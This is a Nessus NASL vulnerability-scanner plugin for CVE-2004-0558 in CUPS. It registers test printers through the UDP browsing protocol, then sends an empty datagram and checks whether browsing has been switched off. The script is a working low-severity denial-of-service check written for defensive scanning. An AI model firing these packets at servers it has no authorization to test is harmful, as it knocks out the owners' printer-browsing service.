#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(15900);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2004-0558");
  script_bugtraq_id(11183);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"9995");
  }

  name["english"] = "CUPS Empty UDP Datagram DoS Vulnerability";
  script_name(english:name["english"]);

  desc["english"] = "
The target is running a CUPS server that supports browsing of network
printers and that is vulnerable to a limited type of denial of service
attack.  Specifically, the browsing feature can be disabled by sending
an empty UDP datagram to the CUPS server. 

Solution : Upgrade to CUPS 1.1.21rc2 or later.

Risk factor : Low";
  script_description(english:desc["english"]);

  summary["english"] = "Checks for Empty UDP Datagram DoS Vulnerability in CUPS";
  script_summary(english:summary["english"]);

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Denial of Service";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "global_settings.nasl", "http_version.nasl");
  script_require_keys("www/cups");
  script_require_ports("Services/www", 631);
  script_require_udp_ports(631);
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


# This function tries to add a printer using the browsing feature.
#
# Args:
#   o port, CUPS port number (note: both tcp and udp port # are assumed equal)
#   o name, a name for the printer
#   o desc, a description of the printer.
#
# Return:
#   1 if successful, 0 otherwise.
function add_printer(port, name, desc) {
  local_var packet, req, res, soc, url;

  # CUPS Browsing Protocol is detailed at <http://www.cups.org/idd.html#4_2>.
  packet = string(
      "6 ",                             # Type (remote printer w/o colour)
      "3 ",                             # State (idle)
      "ipp://example.com:", port, "/printers/", name, " ",  # URI
      '"n/a" ',                         # Location
      '"', desc, '" ',                  # Information
      '"n/a"'                           # Make and model
  );
  if (debug_level) display("debug: sending '", packet, "'.\n");
  soc = open_sock_udp(port);
  # nb: open_sock_udp is unlikely to fail - after all, this is udp.
  if (!soc) return 0;
  send(socket:soc, data:string(packet, "\n"));
  close(soc);

  # Check whether cupsd knows about the printer now.
  url = string("/printers/", name);
  if (debug_level) display("debug: checking '", url, "'.\n");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) return(0);           # can't connect
  if (debug_level) display("debug: received '", res, "'.\n");
  if (egrep(string:res, pattern:string("Description: ", desc))) return 1;
  return 0;
}


host = get_host_name();
ports = add_port_in_list(list:get_kb_list("Services/www"), port:631);
foreach port (ports) {
  # Look at port only if it corresponds to a CUPS server.
  banner = get_http_banner(port:port);
  if (egrep(string:banner, pattern:"Server: CUPS")) {
    if (debug_level) display("debug: checking for empty UDP datagram DoS vulnerability in CUPS on ", host, ":", port, ".\n");

    # NB: since ICMP unreachable are easily dropped by firewalls, we can't
    #     simply probe the UDP port: doing so would risk false positives.
    #     So, we'll try adding a printer using the browsing protocol and
    #     check whether it was indeed added.
    rc = add_printer(port:port, name:"nasl_test1", desc:"NASL Plugin Test #1");

    if (rc == 1) {
      if (debug_level) display("debug: browsing works; sending empty datagram.\n");
      soc = open_sock_udp(port);
      # nb: open_sock_udp is unlikely to fail - after all, this is udp.
      if (!soc) exit(0);
      send(socket:soc, data:"");
      close(soc);
      # NB: if browsing is disabled, cups error log will have lines like:
      #   Oct  6 16:28:18 salt cupsd[26671]: Browse recv failed - No such file or directory.
      #   Oct  6 16:28:18 salt cupsd[26671]: Browsing turned off.

      # Check whether browsing is still enabled.
      if (debug_level) display("debug: testing if port is still open.\n");
      rc = add_printer(port:port, name:"nasl_test2", desc:"NASL Plugin Test #2");
      if (rc == 0) {
        if (debug_level) display("debug: looks like the browser was disabled.\n");
        security_warning(port:port, proto:"udp");
      }
    }
  }
}
